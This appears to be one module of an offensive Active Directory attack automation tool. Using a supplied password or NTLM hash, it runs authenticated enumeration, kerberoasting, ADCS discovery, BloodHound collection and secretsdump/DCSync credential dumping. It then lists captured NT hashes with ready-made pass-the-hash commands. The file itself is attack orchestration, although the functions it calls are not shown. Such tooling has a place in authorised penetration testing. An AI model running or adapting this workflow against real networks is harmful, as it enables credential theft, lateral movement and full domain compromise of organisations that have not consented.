from __future__ import annotations

from .. import ui
from ..modules import authenticated
from ..state import Findings


async def run(findings: Findings, *, user: str,
              password: str | None = None, ntlm_hash: str | None = None) -> None:
    ui.banner(3, findings.target.ip,
              {"domain": findings.target.domain or "?",
               "user": user,
               "auth": "hash" if ntlm_hash else "password",
               "goal": "full enum + BloodHound + secretsdump + ADCS"})

    if not findings.target.domain:
        ui.bad("stage 3 requires a domain. Use -d <domain>.")
        return
    if not (password or ntlm_hash):
        ui.bad("stage 3 requires -p PASSWORD or -H HASH.")
        return

    ui.section("authenticated SMB / shares / users")
    await authenticated.nxc_full_enum(findings, user, password, ntlm_hash)

    ui.section("kerberoasting (TGS-REQ)")
    await authenticated.kerberoast(findings, user, password, ntlm_hash)

    ui.section("ADCS (certipy find)")
    await authenticated.certipy_adcs(findings, user, password, ntlm_hash)

    ui.section("BloodHound collection")
    await authenticated.bloodhound_collect(findings, user, password, ntlm_hash)

    ui.section("secretsdump (DCSync / SAM / LSA)")
    await authenticated.secretsdump(findings, user, password, ntlm_hash)

    print_summary(findings)


def print_summary(findings: Findings) -> None:
    ui.section("stage 3 findings")
    ui.kv_block("collected", {
        "users": len(findings.users),
        "groups": len(findings.groups),
        "computers": len(findings.computers),
        "AS-REP hashes": len(findings.asrep_hashes),
        "Kerberoast hashes": len(findings.kerberoast_hashes),
        "NT hashes (secretsdump)": len(findings.nt_hashes),
        "shares (with access)": len(findings.shares),
    })
    if findings.nt_hashes:
        ui.warn("NT hashes captured. Try pass-the-hash:")
        for account, nt_hash in findings.nt_hashes[:5]:
            short_hash = nt_hash[:6] + "..." + nt_hash[-4:]
            ui.info(
                f"  nxc smb {findings.target.ip} -u {account} -H {short_hash}"
            )
    if findings.vulns:
        ui.kv_block("[red]vulns[/red]", {"items": findings.vulns})
